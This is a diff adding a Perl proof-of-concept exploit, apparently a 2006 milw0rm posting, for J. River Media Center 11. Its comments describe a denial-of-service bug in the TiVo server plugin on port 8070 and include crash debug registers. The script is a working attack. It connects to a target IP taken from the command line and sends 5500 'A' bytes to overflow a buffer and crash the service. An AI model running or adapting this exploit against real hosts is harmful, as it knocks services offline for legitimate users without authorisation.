@@ -1,0 +1,71 @@
+#!/usr/bin/perl
+##Credit to n00b for finding this bug..^ ^
+############################################################################
+#Media Center 11 d0s exploit overly long string.
+#TiVo server plugin..Runs on port tcp :8070
+#Also J. River UPnP Server Version 1.0.34
+#is also afected by the same bug which is just a
+#dos exploit.As we know the port always changes for the
+#UPnP server so you may have to modify the proof of concept a little
+#This exploit will deny legitimate user's from using the service
+#We should see a error with the following msg Upon sucsessfull exploitation.
+#All 3 of the server plugin's will fail includin the library server which
+#is set to port :80 by default.The only debug info i was able to collect
+#at crash time is also provided with the proof of concept.
+#As you can see from the debug info provided we canot control any memory
+#Adresses.
+#Shout's to aelph and every-one who has helped me over the year's.
+#############################################################################
+#   X  Microsoft Visual C ++ Runtime Library
+#
+#   Buffer overrun detected!
+#
+#   C:\Program Files\J River\Media Center 11\Media center.exe
+#
+#   A Buffer overrun has been detected which has corrupted the program's
+#   internal state. The program cannot safely continue execution and must
+#   be now terminated.
+#                                                   Bah fucking shame..
+##############################################################################
+#o/s info: win xp sp.2  Media Center 11.0.309 (not registered)
+#                       \\ DEBUG INFO //
+#
+#eax=77c26ed2 ebx=00000000 ecx=77c1129c edx=00000000 esi=77f7663e edi=00000003
+#eip=7ffe0304 esp=01b7e964 ebp=01b7ea5c iopl=0         nv up ei pl nz na
+pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202
+#SharedUserData!SystemCallStub+0x4:
+#7ffe0304 c3               ret
+##############################################################################
+
+print "Media Center 11.0.309 Remote d0s J River TiVo server all 3 plugin's are vuln by n00b \n";
+
+use IO::Socket;
+
+$ip = $ARGV[0];
+
+$payload = "\x41"x5500;
+
+if(!$ip)
+{
+
+die "you forgot the ip dumb nut\n";
+
+}
+
+$port = '8070';
+
+$protocol = 'tcp';
+
+
+$socket = IO::Socket::INET->new(PeerAddr=>$ip,
+                               PeerPort=>$port,
+                               Proto=>$protocol,
+                               Timeout=>'1') || die "Make sure service is running on the port\n";
+
+
+print $socket $payload;
+
+close($socket);
+
+# milw0rm.com [2006-09-05]
